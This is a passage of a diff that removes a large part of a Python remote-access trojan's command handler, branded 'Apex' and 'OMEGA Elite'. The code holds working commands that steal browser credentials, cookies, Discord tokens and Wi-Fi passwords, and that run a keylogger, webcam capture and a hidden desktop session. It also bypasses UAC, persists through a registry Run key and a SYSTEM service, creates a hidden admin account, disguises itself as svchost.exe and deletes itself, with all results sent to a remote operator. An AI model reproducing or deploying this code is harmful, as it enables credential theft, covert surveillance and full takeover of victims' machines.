-                f"$xml.GetElementsByTagName('text')[1].AppendChild($xml.CreateTextNode('{body}')) | Out-Null;"
-                f"$toast = [Windows.UI.Notifications.ToastNotification]::new($xml);"
-                f"[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Explorer').Show($toast);"
-            )
-            subprocess.run(["powershell", "-NoProfile", "-Command", ps],
-                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    asyncio.get_running_loop().run_in_executor(None, _toast)
-    await send(ws, {"t": "info", "msg": f"🔔 Toast sent: {title}"})
-
-
-
-@register_command("stealer")
-async def cmd_steal_creds(msg, ws):
-    """Apex Stealer: Extracts and exfiltrates browser credentials."""
-    await send(ws, {"t": "info", "msg": "Initiating Apex Credential Extraction..."})
-    from modules.apex import stealer
-    def _run():
-        try:
-            res = stealer.get_browser_creds()
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "loot_resp", "data": res}), 
-                global_loop
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Stealer failed: {e}"}),
-                global_loop
-            )
-    threading.Thread(target=_run, daemon=True).start()
-
-@register_command("wifi_steal")
-async def cmd_wifi_steal(msg, ws):
-    """Apex WiFi Stealer: Extracts all saved WiFi passwords."""
-    await send(ws, {"t": "info", "msg": "Extracting saved WiFi profiles..."})
-    def _run():
-        try:
-            # Get profile list
-            raw = subprocess.check_output("netsh wlan show profiles", shell=True, timeout=5).decode(errors='ignore')
-            profiles = [line.split(":")[1].strip() for line in raw.split("\n") if "All User Profile" in line]
-            
-            res = "--- APEX WIFI INTELLIGENCE ---\n\n"
-            if not profiles:
-                res += "No WiFi profiles found."
-            else:
-                for p in profiles:
-                    try:
-                        p_raw = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, timeout=5).decode(errors='ignore')
-                        pwd = [line.split(":")[1].strip() for line in p_raw.split("\n") if "Key Content" in line]
-                        res += f"SSID: {p.ljust(20)} | PWD: {pwd[0] if pwd else '(None)'}\n"
-                    except:
-                        res += f"SSID: {p.ljust(20)} | PWD: (Error)\n"
-            
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": res}),
-                asyncio.get_event_loop()
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"WiFi steal failed: {e}"}),
-                asyncio.get_event_loop()
-            )
-    asyncio.get_running_loop().run_in_executor(None, _run)
-
-@register_command("discord_steal")
-async def cmd_discord_steal(msg, ws):
-    """Apex Discord Hijacker: Extracts Discord tokens."""
-    await send(ws, {"t": "info", "msg": "Searching for Discord sessions..."})
-    from modules.apex import discord_stealer
-    def _run():
-        try:
-            res = discord_stealer.steal_discord()
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": res}), 
-                asyncio.get_event_loop()
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Discord steal failed: {e}"}),
-                asyncio.get_event_loop()
-            )
-    asyncio.get_running_loop().run_in_executor(None, _run)
-
-@register_command("cookie_steal")
-async def cmd_cookie_steal(msg, ws):
-    """Apex Cookie Stealer: Extracts browser cookies."""
-    await send(ws, {"t": "info", "msg": "Extracting session cookies..."})
-    from modules.apex import cookie_stealer
-    def _run():
-        try:
-            res = cookie_stealer.get_cookies()
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": res}),
-                asyncio.get_event_loop()
-            )
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Cookie steal failed: {e}"}),
-                asyncio.get_event_loop()
-            )
-    asyncio.get_running_loop().run_in_executor(None, _run)
-
-@register_command("uac_bypass")
-async def cmd_uac_bypass(msg, ws):
-    """Silent UAC Bypass: Re-runs agent as Admin."""
-    await send(ws, {"t": "info", "msg": "Attempting silent UAC bypass..."})
-    from modules.persistence import uac_bypass
-    uac_bypass.run_uac_bypass()
-
-@register_command("delete_system32")
-async def cmd_delete_system32(msg, ws):
-    path = os.environ.get("TEMP", "C:\\")
-    await send(ws, {"t": "warn", "msg": f"CRITICAL: Wipe command received for {path}."})
-
-@register_command("reboot")
-async def cmd_reboot(msg, ws):
-    subprocess.Popen(["shutdown", "/r", "/t", "0", "/f"], creationflags=0x08000000)
-
-@register_command("shutdown")
-async def cmd_shutdown(msg, ws):
-    subprocess.Popen(["shutdown", "/s", "/t", "0", "/f"], creationflags=0x08000000)
-
-@register_command("logoff")
-async def cmd_logoff(msg, ws):
-    subprocess.Popen(["shutdown", "/l", "/f"], creationflags=0x08000000)
-
-@register_command("type_text")
-async def cmd_type_text(msg, ws):
-    text = msg.get("text", "")
-    import pyautogui
-    pyautogui.write(text, interval=0.05)
-
-@register_command("press_key")
-async def cmd_press_key(msg, ws):
-    keys = msg.get("keys", "").split("+")
-    import pyautogui
-    pyautogui.hotkey(*keys)
-
-@register_command("move_mouse")
-async def cmd_move_mouse(msg, ws):
-    x = msg.get("x", 0)
-    y = msg.get("y", 0)
-    import pyautogui
-    pyautogui.moveTo(x, y)
-
-@register_command("click_mouse")
-async def cmd_click_mouse(msg, ws):
-    import pyautogui
-    pyautogui.click()
-
-
-@register_command("reg_read")
-async def cmd_reg_read(msg, ws):
-    """Reads a registry value or lists all values/subkeys in a path."""
-    import winreg
-    path_raw = msg.get("path", "")
-    val_name = msg.get("val") # If None, list all
-    
-    try:
-        # Parse Hive
-        hive_map = {
-            "HKCU": winreg.HKEY_CURRENT_USER,
-            "HKLM": winreg.HKEY_LOCAL_MACHINE,
-            "HKU": winreg.HKEY_USERS,
-            "HKCR": winreg.HKEY_CLASSES_ROOT
-        }
-        parts = path_raw.split("\\", 1)
-        hive_str = parts[0].upper()
-        subkey = parts[1] if len(parts) > 1 else ""
-        
-        hive = hive_map.get(hive_str, winreg.HKEY_CURRENT_USER)
-        
-        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as key:
-            if val_name:
-                # Read specific value
-                val, type_id = winreg.QueryValueEx(key, val_name)
-                res = f"Value: {val_name}\nData: {val}\nType: {type_id}"
-                await send(ws, {"t": "shell_out", "data": res})
-            else:
-                # List everything
-                res = f"Registry: {path_raw}\n\n[SUBKEYS]\n"
-                try:
-                    i = 0
-                    while True:
-                        res += f"- {winreg.EnumKey(key, i)}\n"
-                        i += 1
-                except OSError: pass
-                
-                res += "\n[VALUES]\n"
-                try:
-                    i = 0
-                    while True:
-                        name, data, type_id = winreg.EnumValue(key, i)
-                        res += f"- {name} = {data} (Type: {type_id})\n"
-                        i += 1
-                except OSError: pass
-                
-                await send(ws, {"t": "shell_out", "data": res})
-                
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"RegRead Error: {e}"})
-
-@register_command("reg_write")
-async def cmd_reg_write(msg, ws):
-    """Writes a string value to the registry."""
-    import winreg
-    path_raw = msg.get("path", "")
-    val_name = msg.get("val", "")
-    data = msg.get("data", "")
-    
-    try:
-        hive_map = {
-            "HKCU": winreg.HKEY_CURRENT_USER,
-            "HKLM": winreg.HKEY_LOCAL_MACHINE,
-            "HKU": winreg.HKEY_USERS,
-            "HKCR": winreg.HKEY_CLASSES_ROOT
-        }
-        parts = path_raw.split("\\", 1)
-        hive_str = parts[0].upper()
-        subkey = parts[1] if len(parts) > 1 else ""
-        
-        hive = hive_map.get(hive_str, winreg.HKEY_CURRENT_USER)
-        
-        with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_WRITE) as key:
-            winreg.SetValueEx(key, val_name, 0, winreg.REG_SZ, str(data))
-            await send(ws, {"t": "info", "msg": f"Successfully wrote {val_name} to {path_raw}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"RegWrite Error: {e}"})
-
-
-@register_command("get_cameras")
-async def cmd_get_cameras(msg, ws):
-    """Enumerate all available cameras on the target."""
-    try:
-        from core.camera import get_camera_list
-        cams = get_camera_list()
-        res = "--- APEX CAMERA ENUMERATION ---\n\n"
-        if not cams:
-            res += "No cameras detected."
-        else:
-            for c in cams:
-                res += f"[{c['id']}] {c['name']}\n"
-        await send(ws, {"t": "shell_out", "data": res})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Camera Enum Error: {e}"})
-
-@register_command("webcam_snap")
-async def cmd_webcam_snap(msg, ws):
-    """Captures a snapshot from the target's webcam."""
-    from modules.surveillance import webcam
-    idx = msg.get("idx", 0)
-    def _run():
-        res = webcam.capture_webcam(idx)
-        if res.startswith("Error"):
-            asyncio.run_coroutine_threadsafe(send(ws, {"t": "info", "msg": res}), global_loop)
-        else:
-            # Send as a special image type or just info
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "webcam_img", "data": res}),
-                global_loop
-            )
-    global_loop.run_in_executor(None, _run)
-
-@register_command("self_destruct")
-async def cmd_self_destruct(msg, ws):
-    """Removes the agent and all associated files, then exits."""
-    await send(ws, {"t": "info", "msg": "Self-destruct sequence initiated..."})
-    try:
-        exe = sys.executable
-        # Create a batch file to delete the EXE after we exit
-        bat_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
-        with open(bat_path, "w") as f:
-            f.write(f"@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q \"{exe}\"\ndel \"%~f0\"")
-        subprocess.Popen(["cmd.exe", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
-        sys.exit(0)
-    except:
-        sys.exit(0)
-
-@register_command("elevate_system")
-async def cmd_elevate_system(msg, ws):
-    """Installs OMEGA as a SYSTEM service to bypass UAC and see the lock screen."""
-    try:
-        exe_path = sys.executable
-        if not exe_path.endswith(".exe"):
-            await send(ws, {"t": "info", "msg": "Elevation requires a compiled EXE."})
-            return
-
-        service_name = "OmegaEliteSvc"
-        # Copy to a safe location
-        target_dir = os.path.join(os.environ["SystemRoot"], "System32", "OmegaElite")
-        if not os.path.exists(target_dir):
-            os.makedirs(target_dir)
-        target_exe = os.path.join(target_dir, "omega_core.exe")
-
-        # Use powershell to install service (requires Admin to run initially)
-        ps_cmd = f"""
-        Stop-Service -Name {service_name} -ErrorAction SilentlyContinue
-        sc.exe delete {service_name}
-        Copy-Item -Path '{exe_path}' -Destination '{target_exe}' -Force
-        sc.exe create {service_name} binPath= '{target_exe}' start= auto
-        sc.exe description {service_name} "OMEGA Elite Security Service"
-        sc.exe start {service_name}
-        """
-
-        # Run PS as admin (assuming current process is already admin or can prompt)
-        proc = subprocess.Popen(
-            ["powershell", "-Command", ps_cmd],
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-        await send(
-            ws,
-            {
-                "t": "info",
-                "msg": "System Elevation initiated. Check nodes list in 10s.",
-            },
-        )
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Elevation error: {e}"})
-
-
-@register_command("get_system_info")
-async def cmd_get_system_info(msg, ws):
-    """Gathers detailed system audit data including AV status."""
-    try:
-        specs = get_specs()
-        
-        # Antivirus Detection
-        av_status = "None Detected"
-        try:
-            av_cmd = 'powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"'
-            av_raw = subprocess.check_output(av_cmd, shell=True, timeout=5).decode(errors='ignore').strip()
-            if av_raw:
-                av_status = av_raw.replace("\n", ", ")
-        except: pass
-        
-        # Uptime
-        uptime = "Unknown"
-        try:
-            import psutil, datetime
-            boot_time = psutil.boot_time()
-            uptime_seconds = time.time() - boot_time
-            uptime = str(datetime.timedelta(seconds=int(uptime_seconds)))
-        except: pass
-
-        report = {
-            "Host": specs.get("hostname"),
-            "User": f"{specs.get('user')} (ADMIN: {ctypes.windll.shell32.IsUserAnAdmin() != 0})",
-            "OS": specs.get("os"),
-            "CPU": specs.get("cpu"),
-            "GPU": specs.get("gpu"),
-            "RAM": specs.get("ram"),
-            "HWID": get_hwid(),
-            "Local IP": specs.get("local_ip"),
-            "Public IP": specs.get("ipv4"),
-            "Region": specs.get("region"),
-            "Uptime": uptime,
-            "Antivirus": av_status
-        }
-        
-        # Format as table for dashboard
-        res = "--- APEX SYSTEM AUDIT ---\n\n"
-        for k, v in report.items():
-            res += f"{k.ljust(15)}: {v}\n"
-            
-        await send(ws, {"t": "shell_out", "data": res})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Audit Error: {e}"})
-
-@register_command("startup_persist")
-async def cmd_startup_persist(msg, ws):
-    """Sets the agent to run on user logon via Registry Run key."""
-    try:
-        import winreg
-        exe_path = sys.executable
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
-            winreg.SetValueEx(key, "OmegaEliteAgent", 0, winreg.REG_SZ, f'"{exe_path}"')
-            await send(ws, {"t": "info", "msg": "Startup persistence enabled (HKCU Run)."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Persistence Error: {e}"})
-
-@register_command("check_persistence")
-async def cmd_check_persistence(msg, ws):
-    """Verifies if the agent is persistent in the registry."""
-    try:
-        import winreg
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
-            val, _ = winreg.QueryValueEx(key, "OmegaEliteAgent")
-            await send(ws, {"t": "info", "msg": f"Persistence Status: ACTIVE ({val})"})
-    except:
-        await send(ws, {"t": "info", "msg": "Persistence Status: INACTIVE (Registry key not found)"})
-
-
-@register_command("node_stats")
-async def cmd_node_stats(msg, ws):
-    """Returns live CPU%, RAM%, and open window count for the Info tab."""
-    try:
-        import psutil
-        cpu  = psutil.cpu_percent(interval=0.1)
-        ram  = psutil.virtual_memory().percent
-    except Exception:
-        cpu, ram = 0, 0
-
-    # Count visible top-level windows (Windows only)
-    windows = 0
-    try:
-        import ctypes
-        import ctypes.wintypes
-
-        EnumWindows = ctypes.windll.user32.EnumWindows
-        IsWindowVisible = ctypes.windll.user32.IsWindowVisible
-        GetWindowTextLengthW = ctypes.windll.user32.GetWindowTextLengthW
-        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
-
-        count = [0]
-        def _cb(hwnd, _):
-            if IsWindowVisible(hwnd) and GetWindowTextLengthW(hwnd) > 0:
-                count[0] += 1
-            return True
-        EnumWindows(WNDENUMPROC(_cb), 0)
-        windows = count[0]
-    except Exception:
-        pass
-
-    await send(ws, {"t": "node_stats", "cpu": round(cpu, 1), "ram": round(ram, 1), "windows": windows})
-
-
-@register_command("keylog_start")
-async def cmd_keylog_start(msg, ws):
-    _start_keylogger(ws)
-    await send(ws, {"t": "info", "msg": "Keylogger started."})
-
-
-@register_command("keylog_stop")
-async def cmd_keylog_stop(msg, ws):
-    global _keylog_active
-    _keylog_active = False
-    await send(ws, {"t": "info", "msg": "Keylogger stopped."})
-
-
-async def handle(msg, ws):
-    t = msg.get("t") or msg.get("type", "")
-    if t in COMMANDS:
-        try:
-            await COMMANDS[t](msg, ws)
-        except Exception as e:
-            log(f"[HANDLER] Error in '{t}': {e}")
-    elif t == "pong":
-        # Use pong to measure RTT and adjust adaptive quality
-        sent_ts = msg.get("ts", 0)
-        if sent_ts:
-            rtt = (time.time() - sent_ts) * 1000
-            _aq.record_ack(rtt)
-    elif t == "ping":
-        await send(ws, {"t": "pong", "ts": time.time()})
-    else:
-        if t == "stream" and msg.get("cmd") == "start":
-            st.streaming = True
-        elif t == "stream" and msg.get("cmd") == "stop":
-            st.streaming = False
-        elif t == "rtc_toggle":
-            action = msg.get("action")
-            value = msg.get("value", False)
-            source = msg.get("source") # 'mic' or 'desktop'
-            dev_id = msg.get("device_id")
-            if source == "mic":
-                st.mic_active = value
-                if value and dev_id is not None: st.mic_device_id = int(dev_id)
-            else:
-                st.desktop_active = value
-                if value and dev_id is not None: st.desktop_device_id = int(dev_id)
-            log(f"[RTC] {source} -> {value} (dev: {dev_id})")
-        elif t == "audio_devices":
-            import sounddevice as sd
-            devices = sd.query_devices()
-            inputs = []
-            for i, d in enumerate(devices):
-                if d['max_input_channels'] > 0:
-                    inputs.append({"id": i, "name": d['name'], "loopback": "Loopback" in d['name'] or "Stereo Mix" in d['name']})
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"type": "audio_devices", "inputs": inputs}),
-                global_loop
-            )
-        elif t == "audio_start":
-            # Browser sends audio_start with channel='mic'|'desktop' and device=id
-            channel = msg.get("channel", "mic")
-            device  = msg.get("device", None)
-            try:
-                dev_idx = int(device) if (device is not None and str(device).strip() != "") else None
-            except:
-                dev_idx = None
-            if channel == "mic":
-                st.mic_active     = True
-                if dev_idx is not None:
-                    st.mic_device_id = dev_idx
-                log(f"[AUDIO] Mic started (dev={dev_idx})")
-            else:
-                st.desktop_active = True
-                if dev_idx is not None:
-                    st.desktop_device_id = dev_idx
-                log(f"[AUDIO] Desktop started (dev={dev_idx})")
-        elif t == "audio_stop":
-            channel = msg.get("channel", "mic")
-            if channel == "mic":
-                st.mic_active     = False
-                log("[AUDIO] Mic stopped")
-            else:
-                st.desktop_active = False
-                log("[AUDIO] Desktop stopped")
-        elif t == "net_scan":
-            from modules.apex import net_scan
-            def _run():
-                res = net_scan.scan_lan()
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "shell_out", "data": res}),
-                    global_loop
-                )
-            global_loop.run_in_executor(None, _run)
-        elif t in ("hid", "mm", "mc", "scroll", "kd"):
-            # Always import fresh in case bootstrap was late
-            _ih = globals().get("input_hub")
-            if _ih is None:
-                try:
-                    from core.input import input_hub as _ih
-                    globals()["input_hub"] = _ih
-                except Exception as _e:
-                    log(f"[HID] input_hub unavailable: {_e}")
-                    return
-            
-            # Map fast-path 't' to legacy 'cmd' for uniform processing
-            if t == "hid":
-                cmd = msg.get("cmd", "")
-            elif t == "mm":
-                cmd = "mousemove"
-            elif t == "mc":
-                cmd = "mousedown" if msg.get("p", 1) == 1 else "mouseup"
-            elif t == "scroll":
-                cmd = "scroll"
-            elif t == "kd":
-                cmd = "kd"
-            elif t == "hid_reset":
-                # Safety reset: Release all common modifiers and mouse buttons
-                def _reset():
-                    for k in ["Control", "Shift", "Alt", "Meta"]: input_hub.key_event(k, False)
-                    for b in ["left", "right", "middle"]: input_hub.mouse_click(b, False)
-                global_loop.run_in_executor(None, _reset)
-                return
-            else:
-                cmd = ""
-
-            if cmd in ("mousemove", "mousedown", "mouseup"):
-                # Coordinate mapping: normalize 0-1 from browser to absolute pixels
-                sw = _ih.screen_width
-                sh = _ih.screen_height
-                rect = {"left": 0, "top": 0, "width": sw, "height": sh}
-                ce = globals().get("capture_engine")
-                if ce is not None and hasattr(ce, "current_rect"):
-                    rect = ce.current_rect
-                
-                px = int(rect["left"] + float(msg.get("x", 0)) * rect["width"])
-                py = int(rect["top"] + float(msg.get("y", 0)) * rect["height"])
-                
-                if cmd == "mousemove":
-                    # Direct move via SetCursorPos is more reliable than mouse_event for movement
-                    st.hid_queue.put_nowait((_ih.mouse_move, (px, py)))
-                elif cmd == "mousedown":
-                    b_raw = msg.get("btn", msg.get("b", 0))
-                    b = "left" if b_raw == 0 else "right"
-                    if b_raw == 1: b = "middle"
-                    
-                    # We use mouse_click(down=True) but also ensure cursor is at px, py
-                    def _do_down():
-                        _ih.mouse_move(px, py)
-                        _ih.mouse_click(b, True)
-                        
-                    st.hid_queue.put_nowait((_do_down, ()))
-                    log(f"[HID] DOWN RECEIVED: ({px}, {py}) btn={b}")
-                elif cmd == "mouseup":
-                    b_raw = msg.get("btn", msg.get("b", 0))
-                    b = "left" if b_raw == 0 else "right"
-                    if b_raw == 1: b = "middle"
-                    
-                    st.hid_queue.put_nowait((_ih.mouse_click, (b, False)))
-                    log(f"[HID] UP RECEIVED: btn={b}")
-                
-                # Debug logging to local file
-                try:
-                    with open("hid_debug.txt", "a") as f:
-                        f.write(f"{time.ctime()} | {cmd} | x={px} y={py} b={msg.get('b')}\n")
-                except: pass
-
-            elif cmd == "scroll":
-                st.hid_queue.put_nowait((_ih.mouse_scroll, (-msg.get("delta", 0) / 100,)))
-            elif cmd == "kd":
-                key = msg.get("key", "")
-                code = msg.get("code", "")
-                down = msg.get("down", True)
-                eff = key
-                if not eff and code:
-                    eff = code.replace("Key", "").replace("Digit", "").lower()
-                
-                if eff:
-                    st.hid_queue.put_nowait((_ih.key_event, (eff, down)))
-                    try:
-                        with open("hid_debug.txt", "a") as f:
-                            f.write(f"{time.ctime()} | key={eff} down={down}\n")
-                    except: pass
-
-
-# ══════════════════════════════════════════════════════════════════
-# OMEGA ELITE — COMMAND PACK v3  (20 new commands)
-# ══════════════════════════════════════════════════════════════════
-
-@register_command("wifi_passwords")
-async def cmd_wifi_passwords(msg, ws):
-    """Dumps all saved Wi-Fi SSIDs and passwords via netsh."""
-    def _run():
-        try:
-            raw = subprocess.check_output(
-                ["netsh", "wlan", "show", "profiles"],
-                stderr=subprocess.DEVNULL
-            ).decode(errors="ignore")
-            profiles = [l.split(":")[1].strip() for l in raw.splitlines() if "All User Profile" in l]
-            out = "=== SAVED WI-FI PASSWORDS ===\n\n"
-            for p in profiles:
-                try:
-                    d = subprocess.check_output(
-                        ["netsh", "wlan", "show", "profile", p, "key=clear"],
-                        stderr=subprocess.DEVNULL
-                    ).decode(errors="ignore")
-                    key = next((l.split(":")[1].strip() for l in d.splitlines() if "Key Content" in l), "<NONE>")
-                    out += f"SSID : {p}\nPASS : {key}\n{'-'*40}\n"
-                except:
-                    out += f"SSID : {p}\nPASS : <ERROR>\n{'-'*40}\n"
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"WiFi dump error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("set_wallpaper")
-async def cmd_set_wallpaper(msg, ws):
-    """Sets desktop wallpaper from a URL or base64 payload."""
-    import urllib.request, ctypes, tempfile, os
-    url = msg.get("url", "")
-    b64 = msg.get("b64", "")
-    def _run():
-        try:
-            tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
-            if url:
-                urllib.request.urlretrieve(url, tmp.name)
-            elif b64:
-                import base64
-                tmp.write(base64.b64decode(b64))
-                tmp.close()
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp.name, 3)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Wallpaper set: {tmp.name}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Wallpaper error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("get_users")
-async def cmd_get_users(msg, ws):
-    """Lists all local Windows user accounts."""
-    try:
-        raw = subprocess.check_output(["net", "user"], stderr=subprocess.DEVNULL).decode(errors="ignore")
-        await send(ws, {"t": "shell_out", "data": "=== LOCAL USERS ===\n\n" + raw})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"get_users error: {e}"})
-
-
-@register_command("create_user")
-async def cmd_create_user(msg, ws):
-    """Creates a hidden local admin account."""
-    user = msg.get("user", "support$")
-    pwd  = msg.get("pass", "P@ssw0rd123!")
-    try:
-        subprocess.run(["net", "user", user, pwd, "/add", "/expires:never"], check=True, capture_output=True)
-        subprocess.run(["net", "localgroup", "Administrators", user, "/add"], check=True, capture_output=True)
-        subprocess.run(["reg", "add",
-            r"HKLM\SAM\SAM\Domains\Account\Users\Names\\" + user,
-            "/v", "UserAccountControl", "/t", "REG_DWORD", "/d", "0x202", "/f"],
-            capture_output=True)
-        await send(ws, {"t": "info", "msg": f"User '{user}' created and added to Administrators."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"create_user error: {e}"})
-
-
-@register_command("delete_file")
-async def cmd_delete_file(msg, ws):
-    """Deletes a file or directory on the target."""
-    import os, shutil
-    path = msg.get("path", "")
-    try:
-        if os.path.isdir(path):
-            shutil.rmtree(path)
-        else:
-            os.remove(path)
-        await send(ws, {"t": "info", "msg": f"Deleted: {path}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"delete_file error: {e}"})
-
-
-@register_command("read_file")
-async def cmd_read_file(msg, ws):
-    """Reads and returns file contents (text or base64 for binary)."""
-    import os, base64
-    path = msg.get("path", "")
-    def _run():
-        try:
-            size = os.path.getsize(path)
-            if size > 5 * 1024 * 1024:
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": f"File too large ({size//1024}KB). Max 5MB."}), global_loop)
-                return
-            with open(path, "rb") as f:
-                raw = f.read()
-            try:
-                content = raw.decode("utf-8")
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "shell_out", "data": f"=== {path} ===\n\n{content}"}), global_loop)
-            except UnicodeDecodeError:
-                b64 = base64.b64encode(raw).decode()
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "file_download", "name": os.path.basename(path), "b64": b64}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"read_file error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("write_file")
-async def cmd_write_file(msg, ws):
-    """Writes text or base64 content to a path on the target."""
-    import base64, os
-    path    = msg.get("path", "")
-    content = msg.get("content", "")
-    b64     = msg.get("b64", "")
-    try:
-        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
-        if b64:
-            with open(path, "wb") as f:
-                f.write(base64.b64decode(b64))
-        else:
-            with open(path, "w", encoding="utf-8") as f:
-                f.write(content)
-        await send(ws, {"t": "info", "msg": f"Written: {path}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"write_file error: {e}"})
-
-
-@register_command("file_upload")
-async def cmd_file_upload(msg, ws):
-    """Handles chunked file uploads from the dashboard."""
-    import base64, os
-    name    = msg.get("name", "upload.bin")
-    data    = base64.b64decode(msg.get("data", ""))
-    offset  = msg.get("offset", 0)
-    is_last = msg.get("is_last", False)
-    
-    try:
-        # Append mode for chunks
-        mode = "ab" if offset > 0 else "wb"
-        with open(name, mode) as f:
-            f.write(data)
-            
-        if is_last:
-            await send(ws, {"t": "info", "msg": f"Upload finished: {name}"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Upload error: {e}"})
-
-
-@register_command("get_open_ports")
-async def cmd_get_open_ports(msg, ws):
-    """Returns all listening TCP/UDP ports via netstat."""
-    def _run():
-        try:
-            raw = subprocess.check_output(
-                ["netstat", "-ano"], stderr=subprocess.DEVNULL
-            ).decode(errors="ignore")
-            lines = [l for l in raw.splitlines() if "LISTENING" in l or "ESTABLISHED" in l]
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": "=== OPEN PORTS ===\n\n" + "\n".join(lines)}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"ports error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("process_ghost")
-async def cmd_process_ghost(msg, ws):
-    """Clones the agent to a deceptive path and migrates execution."""
-    import shutil, os, sys, subprocess
-    fake_name = msg.get("name", "svchost.exe")
-    target_dir = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\Caches")
-    os.makedirs(target_dir, exist_ok=True)
-    target_path = os.path.join(target_dir, fake_name)
-    
-    try:
-        current_exe = sys.executable
-        if not current_exe.endswith(".exe"):
-             # Handle running from python script
-             current_exe = sys.argv[0]
-             
-        shutil.copy2(current_exe, target_path)
-        
-        # Start the ghost process
-        subprocess.Popen([target_path], start_new_session=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        await send(ws, {"t": "info", "msg": f"Ghost migration initiated: {target_path}. Terminating current process..."})
-        
-        # Give some time for the message to send
-        await asyncio.sleep(1)
-        os._exit(0)
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Ghost error: {e}"})
-
-
-@register_command("hvnc_start")
-async def cmd_hvnc_start(msg, ws):
-    """Spawns an invisible desktop environment (HVNC) and launches a browser."""
-    def _run():
-        try:
-            from modules import hvnc
-            import core.capture as cap
-            hvnc.start_hvnc_session()
-            
-            # Instruct the WebRTC capture engine to target the hidden desktop
-            cap.capture_engine.target_desktop = "MRL_Infinity"
-            
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "👁️ HVNC: Hidden desktop spawned. Check the video stream."}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"HVNC error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-@register_command("hvnc_stop")
-async def cmd_hvnc_stop(msg, ws):
-    """Returns capture engine to the visible Input Desktop."""
-    def _run():
-        try:
-            import core.capture as cap
-            cap.capture_engine.target_desktop = None
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "👁️ HVNC: Returned to physical desktop."}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"HVNC error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-@register_command("get_services")
-async def cmd_get_services(msg, ws):
-    """Lists all Windows services and their state."""
-    def _run():
-        try:
-            raw = subprocess.check_output(
-                ["sc", "query", "type=", "all", "state=", "all"],
-                stderr=subprocess.DEVNULL
-            ).decode(errors="ignore")
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": "=== SERVICES ===\n\n" + raw}), global_loop)
-        except Exception as e:
